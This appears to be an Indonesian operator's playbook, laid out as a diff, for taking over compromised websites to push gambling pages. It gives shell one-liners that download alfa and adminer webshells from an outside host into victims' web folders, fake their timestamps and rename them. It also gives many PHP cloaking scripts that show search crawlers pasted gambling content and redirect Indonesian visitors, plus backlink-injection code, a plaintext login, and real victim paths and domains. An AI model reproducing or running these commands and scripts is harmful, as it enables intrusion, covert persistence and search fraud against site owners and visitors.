@@ -1,0 +1,6813 @@
+
+
+
+
+
+
+TIPS CARI DOMAIN
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+CARI DR MINIMAL 20 KE ATAS
+
+
+
+
+
+
+
+TRAFFIC MINIMAL 200 APA BILA TRAFFIC MENGARAH SESUAI KEDOMAIN YANG KITA BELI
+
+
+
+
+
+
+
+APABILA TRAFFIC 200 TAPI TIDAK MENGARAH KE DOMAIN YANG KITA BELI DAN ACAK ACAKAN (KE FOLDER FOLDER LAIN)
+
+
+
+
+
+
+
+KECUALI TRAFFICNYA SUDAH PULUHAN RIBU (MASIH BISA DI PERTIMBANGKAN ATAU TIDAK)
+
+
+
+
+
+
+
+BACKLINK YANG TIDAK BANYAK SPAM CONTOH MENGARAH KE SITUS BOKEP, ATAU SITUS JUDI LAINNYA (TANDANYA SUDAH DOMAIN ITU SUDAH BEKAS)
+
+
+
+
+
+
+
+UNTUK JUMLAH BACKLINK MINIMAL 1K, DAN 90% DOFOLLOW>
+
+
+
+
+
+
+
+
+
+
+
+
+
+SAAT MEMBELI DOMAIN PASTIKAN DOMAIN TERSEBUT
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ALL GREEN
+
+
+
+
+
+
+
+TERMINAL HIDUP
+
+
+
+
+
+
+
+TIDAK ADA ROOT ATAU WHITE DIR
+
+
+
+
+
+
+
+GSC ON
+
+
+
+
+
+
+
+DOMAINNYA GOOGLE INDEX (SAAT DI CARI SITE:NAMADOMAIN DOMAINNYA MUNCUL PALING ATAS)
+
+
+
+
+
+
+
+SERVER APACE ATAU YANG HARUS DI HINDARI SERVER NGIX DAN LITESPEED (UNTUK LITESPEED MASIH BISA DI PERTIMBANGKAN)
+
+
+
+
+
+
+
+FOKUS AMBIL KE SERVER LINUX JANGAN WINDOWS
+
+
+
+
+
+
+
+
+
+
+
+
+
+CARA INDEX WEB
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+UBAH CANONICAL DI AMP DAN LP
+
+
+
+
+
+
+
+UBAH AMP HTML DI LP
+
+
+
+
+
+
+
+UBAH TITLE DESCRIPTION DAN ARTICLE (KALAU ADA)
+
+
+
+
+
+
+
+UBAH SEMUA GAMBAR UTAMA,GIFT, N ICON
+
+
+
+
+
+
+
+MASUK GSC TAMBAH DOMAIN DI AWALAN URL
+
+
+
+
+
+
+
+AMBIL TAG HTML UBAH DI GOOGLE SITE HTML LP
+
+
+
+
+
+
+
+SCRIPT LP JADIKAN OKELINK
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+TAHAP CLOCKING
+
+
+
+
+
+
+
+MASUK KE SHELL CARI UTAMA DIMANA DAN DOMAIN-CARI INDEX.PHP ATAU HTML
+
+
+
+BUKA INDEX.PHP NOTE: IKUTI ALUR INDEX.PHPNYA KEMANA
+
+
+
+CONTOH INDEX.PHP: 
+
+
+
+/** Loads the WordPress Environment and Template */
+
+require DIR . '/wp-blog-header.php';
+
+
+
+MASUK KE wp-blog-header.php
+
+
+
+// Load the theme template.
+
+require_once ABSPATH . WPINC . '/template-loader.php';
+
+
+
+NOTE :
+
+
+
+-JANGAN CLOCKING DI FILE WP LOAD, WB CONFIG, WB SETTING (PILIHAN TERAKHIR CLOCKING DI INDEX) / SEBELUM CLOCKING PASTIKAN FILE TUJUAN ASLI DI SIMPAN KE NOTEPAD.
+
+
+
+-KALAU SUDAH PASANG 1 SAMPAI 3 SCRIPT CLOCKING NAMUN DOMAINNYA MASIH MATI, ITU TANDANYA HARUS PAKAI SCRIPT WGET ATAU UPLOAD.
+
+
+
+-SAAT DOMAIN SUDAH AMP PASTIKAN DOMAIN TERSEBUT JUGA HARUS HIDUP.
+
+
+
+-SEBELUM CLOCKING ATAU EDIT FILE SELALU PANTAU DOMAIN DAN PASTIKAN SELALU HIDUP 
+
+
+
+
+
+MASUKKAN OKEPASTE LP KE SCRIPT LPNYA :
+
+
+
+
+
+
+
+
+
+
+
+
+
+APA BILA KEJADI NAWALA DI DOMAIN UTAMA TANDANYA SELURUH SUBDO DARI DOMAIN UTAMA ITU TIDAK BISA DI PAKAI LAGI, KARENA UTAMANYA SUDAH KENA
+
+
+
+
+
+
+
+APA BILA SALAH SATU SUBDO TERKENA NAWALA MAKA BISA DI GANTI DENGAN SUBDO LAINNYA
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+COMMAND
+
+a
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Pencari file php di folder paling dalam
+
+
+
+find /home/crcgroup.in/public_html/ -type f -name "*.php" 2>/dev/null | rev | cut -d/ -f2- | rev | sort | uniq | awk '{print split($0, a, "/"), $0}' | sort -nr | head -n 100000
+
+find /data/7/0/70b580bb-bdee-4621-89a5-9fde217b8fe8/tunetegyuttes.hu/web/public/ -type d -printf '%d %p\n' 2>/dev/null | sort -nr | cut -d' ' -f2-
+
+
+
+Babu penabur shell instan satu persatu
+
+
+
+TARGET_DIR="/home/lqudynam3/public_html/" && URL_TRACKING="https://hushh.pro/a1/webshell/alfasc.txt" && find "$TARGET_DIR" -type f -name "*.php" -exec dirname {} \; | sort | uniq | shuf -n 3 | while read -r folder; do wget -q -O "$folder/dev-by-lijunxi.php" "$URL_TRACKING" && echo "Kontol lu tersebar di: $folder/dev-by-lijunxi.php"; done
+
+
+
+Babu penabur shell instan satu group
+
+
+
+TARGET_DIR="/home/makepayment.in/public_html/" && URLS=("https://hushh.pro/a1/webshell/alfasc.txt" "https://hushh.pro/a1/webshell/alfa.txt" "https://hushh.pro/a1/webshell/adminer.txt") && FILENAMES=("dev-by-lijunxi-1.php" "dev-by-lijunxi-2.php" "dev-by-lijunxi-3.php") && FOLDERS=$(find "$TARGET_DIR" -type f -name "*.php" -exec dirname {} \; | sort -u | awk '{ print gsub("/","/"), $0 }' | sort -rn | head -n 3 | awk '{$1=""; print $0}') && IFS=$'\n' read -d '' -ra FOLDER_ARRAY <<< "$FOLDERS" && for i in "${!URLS[@]}"; do wget -q -O "${FOLDER_ARRAY[i]}/${FILENAMES[i]}" "${URLS[i]}" && echo "File berhasil diunduh ke: ${FOLDER_ARRAY[i]}/${FILENAMES[i]}"; done
+
+
+
+Babu pengganti tanggal pada file yang di tuju
+
+
+
+find /home/u883189129/domains/aswinayurvedplus.com/public_html/ -type f -name "dev-by-lijunxi.php" -print -exec touch -t $(date -d "2023-01-01 +$(shuf -i 0-364 -n 1) days +$(shuf -i 0-23 -n 1) hours +$(shuf -i 0-59 -n 1) minutes" "+%Y%m%d%H%M") {} \; -exec echo "Waktu file sudah diubah: {}" \;
+
+
+
+Babu pengganti nama file yang di tuju
+
+
+
+find /home/u883189129/domains/aswinayurvedplus.com/public_html/ -type f -name "dev-by-lijunxi.php" -exec bash -c 'dir=$(dirname "$1"); mv "$1" "$dir/DChaCha20.php"; echo "Nama file telah diubah ke $dir/DChaCha20.php"' _ {} \;
+
+
+
+Babu penghapus file yang namanya sama
+
+
+
+find /home/lqudynam3/public_html/ -type f -name "dev-by-lijunxi.php" -print -exec rm {} \; | while read -r deleted_file; do echo "File tujuan sudah terhapus: $deleted_file"; done
+
+
+
+Babu penghapus file yang namanya sama versi bisa menghapus
+
+
+
+find /home/lqudynam3/public_html/ -type f \( -name "dev-by-lijunxi-1.php" -o -name "dev-by-lijunxi-2.php" -o -name "dev-by-lijunxi-3.php" -o -name "xax.php" -o -name "xxc.php" \) -print -exec rm {} \; | while read -r deleted_file; do echo "File tujuan sudah terhapus: $deleted_file"; done
+
+
+
+Babu untuk mencari nama file
+
+
+
+find /home/makepayment.in/public_html/ -type f -name "dev-by-lijunxi.php"
+
+
+
+Cloaking lexi
+
+
+
+<?php
+
+function check_user_agent($agent) {
+
+  return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
+
+}
+
+
+
+$useragent_code = <<<'HTML'
+
+
+
+LP DI SINI
+
+
+
+HTML;
+
+
+
+if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) {
+
+  echo $useragent_code;
+
+  exit;
+
+}
+
+?>
+
+
+
+include '/home/choixass/moncredit/wp-includes/js/jquery/ui/effect-motions.min.js';
+
+
+
+
+
+Cloacking pasteSHM
+
+
+
+<?php
+
+function is_bot() {
+
+  $user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+  $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+
+   
+
+  foreach ($bots as $bot) {
+
+    if (stripos($user_agent, $bot) !== false) {
+
+      return true;
+
+    }
+
+  }
+
+   
+
+  return false;
+
+}
+
+
+
+if (is_bot()) { 
+
+  $message = file_get_contents('https://pastedav.id/d/tgDjwHZL'); // 
+
+  echo $message; 
+
+  (exit);
+
+}
+
+?>
+
+
+
+Cloacking paste
+
+
+
+<?php
+
+function is_bot() {
+
+  $user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+  $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+
+   
+
+  foreach ($bots as $bot) {
+
+    if (stripos($user_agent, $bot) !== false) {
+
+      return true;
+
+    }
+
+  }
+
+   
+
+  return false;
+
+}
+
+
+
+if (is_bot()) {
+
+  $message = file_get_contents('https://okepaste.cc/r/6c5fe583);
+
+  echo $message;
+
+exit; // Atau bisa menggunakan die()
+
+}
+
+?>
+
+
+
+
+
+Cloacking lainnya
+
+
+
+
+
+<?php
+
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
+
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+
+
+
+if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
+
+echo file_get_contents('https://okepaste.cc/r/d0a34891');
+
+exit();
+
+}
+
+?>
+
+
+
+Cloacking #1
+
+
+
+<?php
+
+
+
+date_default_timezone_set('Asia/Bangkok');
+
+
+
+
+
+function getGeoIP() {
+
+  $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+  $geoip = @file_get_contents("https://pro.ip-api.com/json/{$ip}?key=Estgcqest5byzqG");
+
+  return $geoip ? json_decode($geoip, true) : null;
+
+}
+
+
+
+
+
+$geoip = getGeoIP();
+
+$countryCode = $geoip['countryCode'] ?? '';
+
+$language = strtolower(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '', 0, 2));
+
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
+
+
+
+
+
+function isBot($userAgent) {
+
+  if (preg_match('/Google|Googlebot|bot|FeedBurner|mediapartners|spider|crawl|feed|slurp|Google-InspectionTool/i', $userAgent)) {
+
+    return true;
+
+  }
+
+  $botKeywords = ['crawl', 'spider', 'slurp', 'mediapartners', 'feed', 'Googlebot'];
+
+  foreach ($botKeywords as $botKeyword) {
+
+    if (strpos(strtolower($userAgent), $botKeyword) !== false) {
+
+      return true;
+
+    }
+
+  }
+
+  return false;
+
+}
+
+
+
+$isBot = isBot($userAgent);
+
+
+
+
+
+if ($isBot) {
+
+  if ($_SERVER['REQUEST_URI'] !== '/') {
+
+    header("HTTP/1.1 301 Moved Permanently");
+
+    header("Location: /");
+
+    exit;
+
+  } else {
+
+    include DIR . '/alfacgiapi/alex.php';
+
+    exit;
+
+  }
+
+} elseif ($countryCode === 'ID' $language === 'id' $language === 'ID') {
+
+  header("Location: https://selink.cc/5mpeq");
+
+  exit;
+
+}
+
+
+
+
+
+
+
+define('WP_USE_THEMES', true);
+
+require DIR . '/wp-blog-header.php';
+
+?>
+
+
+
+Cloacking #3
+
+
+
+<?php
+
+error_reporting(0);
+
+
+
+$http_referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+
+$user_agent  = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+$lan     = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']) : '';
+
+
+
+function get_client_ip() {
+
+  $arr_ip_header = array(
+
+    'HTTP_CDN_SRC_IP',
+
+    'HTTP_PROXY_CLIENT_IP',
+
+    'HTTP_WL_PROXY_CLIENT_IP',
+
+    'HTTP_CLIENT_IP',
+
+    'HTTP_X_FORWARDED_FOR',
+
+    'REMOTE_ADDR',
+
+  );
+
+
+
+  $client_ip = 'unknown';
+
+
+
+  foreach ($arr_ip_header as $key) {
+
+    if (!empty($_SERVER[$key]) && strtolower($_SERVER[$key]) != 'unknown') {
+
+
+
+      if ($key == 'HTTP_X_FORWARDED_FOR') {
+
+        $ips = explode(',', $_SERVER[$key]);
+
+        $client_ip = trim($ips[0]);
+
+      } else {
+
+        $client_ip = $_SERVER[$key];
+
+      }
+
+      break;
+
+    }
+
+  }
+
+  return $client_ip;
+
+}
+
+
+
+$dy = array(
+
+  array(
+
+    'jiechizhizhu'  => 'raafansw.org.au',
+
+    'zhizhufanhui'  => 'https://akongisback.com/amp3/conohawing/pastigacorlek.html',
+
+    'jiechitiaozhuan' => 'raafansw.org.au',
+
+    'tiaozhuan'    => 'https://akongisback.com/amp3/conohawing/pastigacorlek.html',
+
+  ),
+
+);
+
+
+
+$user_cl = get_client_ip();
+
+
+
+// Gabungkan host dan request URI
+
+$uri = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+
+
+
+// Normalisasi URI dengan menghapus trailing slash
+
+$normalized_uri = rtrim($uri, "/");
+
+
+
+if (!empty($dy)) {
+
+
+
+  $bot_pattern = "/(googlebot|slurp|google adsense|google-inspectiontool|google-site-verification)/i";
+
+
+
+  if (preg_match($bot_pattern, $user_agent)) {
+
+
+
+    foreach ($dy as $val) {
+
+      // Hanya aktifkan jika URL tepat sama dengan target (homepage)
+
+      if ($normalized_uri === $val['jiechizhizhu'] && !empty($val['zhizhufanhui'])) {
+
+        $content = file_get_contents($val['zhizhufanhui']);
+
+        if ($content !== false) {
+
+          echo $content;
+
+        }
+
+        exit;
+
+      }
+
+    }
+
+  } elseif (!empty($http_referer)) { 
+
+    foreach ($dy as $val) {
+
+      if ($normalized_uri === $val['jiechitiaozhuan'] && !empty($val['tiaozhuan'])) {
+
+        
+
+        $ch = curl_init();
+
+        $api_url = "http://ip-api.com/json/$user_cl";
+
+        curl_setopt($ch, CURLOPT_URL, $api_url);
+
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
+
+        $ip_response = curl_exec($ch);
+
+        if (curl_errno($ch)) {
+
+          curl_close($ch);
+
+          break;
+
+        }
+
+        curl_close($ch);
+
+
+
+        $jsonArea = json_decode($ip_response, true);
+
+
+
+        if (!empty($jsonArea) && !empty($jsonArea['countryCode']) && strtolower($jsonArea['countryCode']) == 'id') {
+
+          header('Location: ' . $val['tiaozhuan']);
+
+          exit;
+
+        }
+
+      }
+
+    }
+
+  }
+
+}
+
+
+
+
+
+SCRIPT ANTI COPYRIGHT
+
+
+
+<script>
+
+  (function() {
+
+    const handleKey = function(e) {
+
+      if ((e.ctrlKey && (e.key === "u" || e.key === "s" || e.key === "p")) ||
+
+        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+
+        (e.key === "F12")) {
+
+        e.preventDefault();
+
+        e.stopPropagation();
+
+      }
+
+    };
+
+
+
+    const handleContext = function(e) {
+
+      e.preventDefault();
+
+      e.stopPropagation();
+
+    };
+
+
+
+    document.addEventListener("keydown", handleKey);
+
+    document.addEventListener("contextmenu", handleContext);
+
+  })();
+
+</script>
+
+
+
+Cloacking index
+
+
+
+<?php
+
+function isDefined() {
+
+  $userAgents = array(
+
+  'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'Windows Phone',
+
+  'webOS', 'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
+
+  'Google-InspectionTool', 'Googlebot-Image', 'Googlebot-News', 'Googlebot-Video',
+
+  'Storebot-Google', 'GoogleOther', 'GoogleOther-Image', 'GoogleOther-Video',
+
+  'Google-CloudVertexBot', 'Google-Extended', 'APIs-Google', 'AdsBot-Google-Mobile',
+
+  'AdsBot-Google', 'Mediapartners-Google', 'FeedFetcher-Google', 'Google-Favicon',
+
+  'Google Favicon', 'Googlebot-Favicon', 'Google-Read-Aloud', 'GoogleProducer',
+
+  'Google Web Preview', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 
+
+  'YandexBot', 'Sogou', 'Exabot', 'facebookexternalhit', 'ia_archiver', 
+
+  'Alexa Crawler', 'AhrefsBot', 'Semrushbot');
+
+
+
+  if(isset($_SERVER['HTTP_SEC_CH_UA_MOBILE']) && strtolower($_SERVER['HTTP_SEC_CH_UA_MOBILE']) == '?1'){return true;}
+
+  foreach ($userAgents as $agent) {
+
+    if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {return true;}
+
+  } return false;
+
+}
+
+
+
+if(isDefined()){
+
+  $url = 'https://okepaste.cc/r/483285e5';
+
+  $landingPageContent = file_get_contents($url);
+
+  die($landingPageContent);
+
+} 
+
+?>
+
+
+
+Cloacking lancartoto
+
+
+
+<?php
+
+
+
+$googleBots = array(
+
+  "Googlebot",
+
+  "Google-Site-Verification",
+
+  "Google-InspectionTool",
+
+  "Googlebot-Mobile",
+
+  "Googlebot-News"
+
+);
+
+
+
+$isGoogleBot = false;
+
+
+
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+
+  foreach ($googleBots as $bot) {
+
+    if (stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
+
+      $isGoogleBot = true;
+
+      break;
+
+    }
+
+  }
+
+}
+
+
+
+if ($isGoogleBot) {
+
+  $bot_content = file_get_contents('system/data/index.php');
+
+  echo $bot_content;
+
+  exit;
+
+} else {
+
+  include('readme.txt');
+
+  exit;
+
+}
+
+?>
+
+
+
+Cloacking index 3 php
+
+
+
+<?php
+
+function is_google_bot() {
+
+  if (isset($_SERVER['HTTP_USER_AGENT'])) {
+
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+    $google_agents = ['Googlebot', 'Mediapartners-Google', 'Google-InspectionTool'];
+
+    foreach ($google_agents as $agent) {
+
+      if (stripos($user_agent, $agent) !== false) {
+
+        return true;
+
+      }
+
+    }
+
+  }
+
+  return false;
+
+}
+
+function is_from_indonesia_and_google() {
+
+  if (isset($_SERVER['HTTP_REFERER'])) {
+
+    $referer = $_SERVER['HTTP_REFERER'];
+
+    $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+
+    if (strpos($referer, 'google.co.id') !== false || (strpos($referer, 'google.com') !== false && strpos($accept_lang, 'id') !== false)) {
+
+      return true;
+
+    }
+
+  }
+
+  return false;
+
+}
+
+if (is_google_bot()) {
+
+include __DIR__ . '/wp-content/home.html';
+
+} else {
+
+  include('./wp-blog-header.php');
+
+  exit;
+
+}
+
+?>
+
+
+
+Cloacking index 4 php
+
+
+
+<?php
+
+function isDefined() {
+
+  $userAgents = array(
+
+  'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'Windows Phone',
+
+  'webOS', 'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
+
+  'Google-InspectionTool', 'Googlebot-Image', 'Googlebot-News', 'Googlebot-Video',
+
+  'Storebot-Google', 'GoogleOther', 'GoogleOther-Image', 'GoogleOther-Video',
+
+  'Google-CloudVertexBot', 'Google-Extended', 'APIs-Google', 'AdsBot-Google-Mobile',
+
+  'AdsBot-Google', 'Mediapartners-Google', 'FeedFetcher-Google', 'Google-Favicon',
+
+  'Google Favicon', 'Googlebot-Favicon', 'Google-Read-Aloud', 'GoogleProducer',
+
+  'Google Web Preview', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 
+
+  'YandexBot', 'Sogou', 'Exabot', 'facebookexternalhit', 'ia_archiver', 
+
+  'Alexa Crawler', 'AhrefsBot', 'Semrushbot');
+
+
+
+  if(isset($_SERVER['HTTP_SEC_CH_UA_MOBILE']) && strtolower($_SERVER['HTTP_SEC_CH_UA_MOBILE']) == '?1'){return true;}
+
+  foreach ($userAgents as $agent) {
+
+    if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {return true;}
+
+  } return false;
+
+}
+
+
+
+if(isDefined()){
+
+  $url = 'https://okepaste.cc/r/c0629e9f';
+
+  $landingPageContent = file_get_contents($url);
+
+  die($landingPageContent);
+
+} 
+
+
+
+
+
+
+
+######## CLOAKING INDEX 5 PHP ########
+
+
+
+<?php
+
+function is_google_bot() {
+
+$agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+
+foreach ($agents as $agent) {
+
+if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+
+}
+
+return false;
+
+}
+
+
+
+if (is_google_bot()) {
+
+$bot_content = file_get_contents('data/index.php');
+
+echo $bot_content;
+
+exit;
+
+} else {
+
+include('config.php');
+
+exit;
+
+}
+
+?>
+
+
+
+Cloacking index 6 php
+
+
+
+<?php
+
+header('Vary: Accept-Language');
+
+header('Vary: User-Agent');
+
+
+
+function get_client_ip() {
+
+  return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
+
+}
+
+
+
+function make_request($url) {
+
+  if (ini_get('allow_url_fopen')) {
+
+    return @file_get_contents($url);
+
+  } elseif (function_exists('curl_init')) {
+
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+
+    $response = curl_exec($ch);
+
+    curl_close($ch);
+
+    return $response;
+
+  }
+
+  return false;
+
+}
+
+
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+
+$ip = get_client_ip();
+
+
+
+$bot_url = "https://pub-685bcb4b76f34b80bfc72857778d499e.r2.dev/kksetiu.mypolycc.edu.mymega888.html";
+
+
+
+$file = make_request($bot_url);
+
+
+
+$geolocation = @json_decode(make_request("http://ip-api.com/json/{$ip}"), true);
+
+
+
+$cc = $geolocation['countryCode'] ?? '';
+
+
+
+$botchar = "/(googlebot|slurp|adsense|inspection|verifycation|jenifer)/";
+
+
+
+$fingerprint = md5($ua . $ip . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '') . ($_SERVER['HTTP_ACCEPT_ENCODING'] ?? ''));
+
+
+
+if (preg_match($botchar, $ua)) {
+
+  echo $file;
+
+  exit;
+
+}
+
+
+
+if ($cc === "ID" || $fingerprint === "known_bad_fingerprint") {
+
+  header("HTTP/1.1 302 Found");
+
+  header("Location: ".$reff_url);
+
+  exit();
+
+}
+
+
+
+if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
+
+  header("HTTP/1.1 302 Found");
+
+  header("Location: ".$reff_url);
+
+  exit();
+
+}
+
+?>
+
+
+
+Cloacking index 7 php
+
+
+
+<?php
+
+header('Vary: Accept-Language');
+
+header('Vary: User-Agent');
+
+
+
+function get_client_ip() {
+
+  return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
+
+}
+
+
+
+function make_request($url) {
+
+  if (ini_get('allow_url_fopen')) {
+
+    return @file_get_contents($url);
+
+  } elseif (function_exists('curl_init')) {
+
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+
+    $response = curl_exec($ch);
+
+    curl_close($ch);
+
+    return $response;
+
+  }
+
+  return false;
+
+}
+
+
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+
+$ip = get_client_ip();
+
+
+
+$bot_url = "https://hcxseo.com/r/90f5ef/raw";
+
+$reff_url = "https://bisanya-cuma-main-dmca.pages.dev/amp/";
+
+
+
+$file = make_request($bot_url);
+
+
+
+$geolocation = @json_decode(make_request("http://ip-api.com/json/{$ip}"), true);
+
+
+
+$cc = $geolocation['countryCode'] ?? '';
+
+
+
+$botchar = "/(googlebot|slurp|adsense|inspection|verifycation|jenifer)/";
+
+
+
+$fingerprint = md5($ua . $ip . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '') . ($_SERVER['HTTP_ACCEPT_ENCODING'] ?? ''));
+
+
+
+if (preg_match($botchar, $ua)) {
+
+  echo $file;
+
+  exit;
+
+}
+
+
+
+if ($cc === "ID" || $fingerprint === "known_bad_fingerprint") {
+
+  header("HTTP/1.1 302 Found");
+
+  header("Location: ".$reff_url);
+
+  exit();
+
+}
+
+
+
+if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
+
+  header("HTTP/1.1 302 Found");
+
+  header("Location: ".$reff_url);
+
+  exit();
+
+}
+
+?>
+
+
+
+Cloacking end
+
+
+
+error_reporting(0);
+
+
+
+$http_referer = $_SERVER['HTTP_REFERER'] ?? '';
+
+$user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+$lan     = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
+
+
+
+function get_client_ip() {
+
+  $arr_ip_header = [
+
+    'HTTP_CDN_SRC_IP',
+
+    'HTTP_PROXY_CLIENT_IP',
+
+    'HTTP_WL_PROXY_CLIENT_IP',
+
+    'HTTP_CLIENT_IP',
+
+    'HTTP_X_FORWARDED_FOR',
+
+    'REMOTE_ADDR',
+
+  ];
+
+
+
+  foreach ($arr_ip_header as $key) {
+
+    if (!empty($_SERVER[$key]) && strtolower($_SERVER[$key]) != 'unknown') {
+
+      if ($key == 'HTTP_X_FORWARDED_FOR') {
+
+        $ips = explode(',', $_SERVER[$key]);
+
+        return trim($ips[0]);
+
+      } else {
+
+        return $_SERVER[$key];
+
+      }
+
+    }
+
+  }
+
+  return 'unknown';
+
+}
+
+
+
+$dy = [
+
+  [
+
+    'jiechizhizhu'  => 'www.jhs.sabu.edu.ly',
+
+    'zhizhufanhui'  => 'https://pastigacorlek.xyz/happyweb/hapyweb.html',
+
+  ],
+
+];
+
+
+
+$user_cl = get_client_ip();
+
+$uri = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+
+$normalized_uri = rtrim($uri, "/");
+
+
+
+if (!empty($dy)) {
+
+  $bot_pattern = "/(bot|crawl|spider|slurp|googlebot|google adsense|google-inspectiontool|google-site-verification|adsbot-google|google favicon|mediapartners-google|google|gsa-crawler|apis-google|feedfetcher-google|googleweblight|storebot-google)/i";
+
+
+
+  foreach ($dy as $val) {
+
+    if (preg_match($bot_pattern, $user_agent)) {
+
+      if ($normalized_uri === $val['jiechizhizhu']) {
+
+        $content = file_get_contents($val['zhizhufanhui']);
+
+        if ($content !== false) {
+
+          echo $content;
+
+        }
+
+        exit;
+
+      }
+
+    }
+
+  }
+
+}
+
+
+
+
+
+
+
+Cloacking backlink
+
+
+
+<?php echo file_get_contents("https://amp-aku.com/backlink/index.txt");?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+https://pastedav.id/login
+
+Pastedav
+
+Pastdav@89
+
+
+
+
+
+
+
+
+
+
+
+
+
+SCRIPT BACKLINK
+
+
+
+// Serve the request
+
+$application->execute();
+
+$curl = curl_init();
+
+$url = 'https://twins-4e372.web.app/backlink/404.txt';
+
+curl_setopt($curl, CURLOPT_URL, $url);
+
+curl_setopt($curl, CURLOPT_HEADER, 0);
+
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+
+$result = curl_exec($curl);
+
+echo $result;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SHELL KERAS
+
+
+
+<?php 
+
+  function get($url) { 
+
+  $ch = curl_init(); 
+
+ 
+
+  curl_setopt($ch, CURLOPT_HEADER, 0); 
+
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+
